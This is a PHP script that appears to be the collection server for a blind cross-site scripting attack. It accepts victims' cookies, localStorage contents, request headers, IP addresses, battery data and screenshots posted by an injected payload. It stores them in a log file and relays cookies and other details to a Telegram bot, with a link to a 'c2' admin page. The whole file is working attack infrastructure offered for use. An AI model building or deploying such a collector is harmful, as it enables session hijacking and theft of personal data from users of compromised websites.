<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

$token = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX';
$chat_id = '-100000000000000000000000000000';
$logs_file = __DIR__.'/logs.json';

function load_logs($file) {
    return file_exists($file) ? json_decode(file_get_contents($file), true) : [];
}

function save_logs($file, $logs) {
    file_put_contents($file, json_encode($logs, JSON_PRETTY_PRINT));
}

// Process 'data' field from uploaded file
$data = [];
if (isset($_FILES['data']) && $_FILES['data']['error'] === UPLOAD_ERR_OK) {
    $dataContent = file_get_contents($_FILES['data']['tmp_name']);
    $data = json_decode($dataContent, true) ?: [];
}

$ip = $_SERVER['REMOTE_ADDR'];
$headers = getallheaders();

// Prepare log data
$log = [
    'ip'          => $ip,
    'headers'     => $headers,
    'battery'     => $data['battery'] ?? 'N/A',
    'cookies'     => $data['cookies'] ?? 'N/A',
    'referrer'    => urldecode($data['referrer'] ?? 'unknown'),
    'time'        => date('c'),
    'localStorage' => $data['localStorage'] ?? 'N/A',
    'screenshot'  => null
];

// Update logs
$logs = load_logs($logs_file);
$logs[] = $log;
save_logs($logs_file, $logs);
// Telegram notification
$msg = "<b>Blind XSS</b>\n";
$msg .= "<b>Referrer:</b> " . htmlspecialchars($log['referrer']) . "\n";
$msg .= "<b>Battery:</b> " . htmlspecialchars($log['battery']) . "\n";
$msg .= "<b>IP:</b> " . htmlspecialchars($ip) . "\n";
$msg .= "<b>Cookies:</b>\n<pre>" . htmlspecialchars($log['cookies']) . "</pre>\n";
$msg .= "<a href=\"https://c2.com/admin.php\">View full log</a>";

// Send to Telegram with HTML formatting and web preview disabled
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
    'chat_id' => $chat_id,
    'text' => $msg,
    'parse_mode' => 'HTML',
    'disable_web_page_preview' => 'true'
]));

// Handle screenshot
if (isset($_FILES['screenshot']) && $_FILES['screenshot']['error'] === UPLOAD_ERR_OK) {
    $dir = __DIR__.'/screenshots';
    !is_dir($dir) && mkdir($dir, 0777, true);
    
    $fileName = uniqid().'.png';
    move_uploaded_file($_FILES['screenshot']['tmp_name'], "$dir/$fileName");
    
    $logs[count($logs)-1]['screenshot'] = $fileName;
    save_logs($logs_file, $logs);
}

echo json_encode(['status' => 'success']);
?>
